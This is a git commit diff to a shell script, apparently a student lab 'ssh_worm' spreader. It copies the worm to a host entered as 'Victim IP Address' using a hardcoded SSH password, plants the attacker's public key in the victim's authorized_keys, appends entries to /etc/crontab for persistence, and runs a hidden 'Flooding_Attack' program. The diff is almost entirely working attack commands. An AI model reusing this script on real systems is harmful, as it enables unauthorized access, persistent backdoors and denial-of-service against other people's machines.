2bb10ac9aa06d09e33d831731b7afd0e096314db
SongYun <william0228.cs05@g2.nctu.edu.tw>
2019-05-01 20:28:45 +0800

    debug

--- qq.sh
+++ qq.sh
@@ -3,23 +3,32 @@
 export SSHPASS='hihi123'
 
 read -p "Enter Victim IP Address: " IP_Address
+
 sshpass -e scp -r /home/victim/Desktop/ssh_worm victim@"$IP_Address":/home/victim/Desktop
-
-
 
 
 # publickey
 SSH_PATH="/home/victim/.ssh"
 
-(
-echo "\r"
-sleep 1
-echo "y\r"
-sleep 1
-echo "\r"
-sleep 1
-echo "\r"
-)|ssh-keygen
+if ["$1" = "y"]
+then
+	(
+	echo "\r"
+	sleep 1
+	echo "\r"
+	sleep 1
+	echo "\r"
+	sleep 1
+	echo "\r"
+	)|ssh-keygen
+else 
+	(
+	echo "\r"
+	sleep 1
+	echo "n\r"
+	sleep 1
+	)|ssh-keygen
+fi
 
 sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/
 sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/authorized_keys
@@ -43,7 +52,7 @@ echo "qq2"
 
 ssh victim@"$IP_Address" 'Hidden2="/home/victim/.Launch_Attack";
 			echo "$(cat /home/victim/Desktop/ssh_worm/crontab.txt)" >> /etc/crontab;
-			cd "$Hidden2" && ./Check_Attack;
+			cd "$Hidden2" && ./Flooding_Attack;
 			cd /home/victim/Desktop/ssh_worm > /dev/null 2>&1'
 
 echo "qq3"
